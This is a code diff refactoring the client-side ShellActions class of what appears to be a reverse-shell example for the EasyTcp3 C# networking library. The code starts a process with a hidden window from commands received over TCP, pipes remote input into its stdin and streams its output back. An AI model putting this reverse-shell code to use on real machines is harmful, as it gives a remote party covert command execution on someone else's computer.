@@ -1,3 +1,4 @@
+using System;
 using System.Diagnostics;
 using System.Linq;
 using EasyTcp3.Actions;
@@ -7,7 +8,7 @@ using EasyTcp3.EasyTcpPacketUtils;
 namespace EasyTcp3.Examples.ReverseShell.Client.Actions
 {
     /// <summary>
-    /// Actions that add support for a remote shell 
+    /// Class with actions for a remote shell 
     /// </summary>
     public class ShellActions
     {
@@ -21,29 +22,12 @@ namespace EasyTcp3.Examples.ReverseShell.Client.Actions
         /// old process gets disposed 
         /// </summary>
         [EasyTcpAction("execute")]
-        public void Execute(object s, Message e)
+        public void Execute(Message e)
         {
-            _process?.Dispose(); // Dispose old process if possible
-            _process = CreateProcess(e);
-            e.Client.Send("Created new process");
-        }
-
-        /// <summary>
-        /// Pipe string into stdin of process 
-        /// </summary>
-        [EasyTcpAction(">")]
-        public void PipeIntoProcess(object s, Message e)
-            => _process?.StandardInput.WriteLine(e.Decompress().ToString().Replace(':',' '));
-
-        /// <summary>
-        /// Create a new process
-        /// </summary>
-        /// <returns>new created process</returns>
-        private Process CreateProcess(Message e)
-        {
+            _process?.Dispose(); // Dispose old process if not null 
             var args = e.Decompress().ToString().Split(':');
 
-            var startInfo = new ProcessStartInfo()
+            var startInfo = new ProcessStartInfo
             {
                 RedirectStandardInput = true,
                 RedirectStandardOutput = true,
@@ -53,12 +37,20 @@ namespace EasyTcp3.Examples.ReverseShell.Client.Actions
                 WindowStyle = ProcessWindowStyle.Hidden
             };
 
-            var p = Process.Start(startInfo);
-            p.OutputDataReceived += (s, a) => e.Client.Send(a.Data);
-            p.BeginOutputReadLine();
-            p.ErrorDataReceived += (s, a) => e.Client.Send(a.Data);
-            p.BeginErrorReadLine();
-            return p;
+            _process = Process.Start(startInfo);
+            _process.OutputDataReceived += (s, a) => e.Client.Send(a.Data);
+            _process.BeginOutputReadLine();
+            _process.ErrorDataReceived += (s, a) => e.Client.Send(a.Data);
+            _process.BeginErrorReadLine();
+
+            e.Client.Send("Created new process");
         }
+
+        /// <summary>
+        /// Pipe string into stdin of process 
+        /// </summary>
+        [EasyTcpAction(">")]
+        public void PipeIntoProcess(Message e)
+            => _process?.StandardInput.WriteLine(e.Decompress().ToString().Replace(':', ' '));
     }
 }
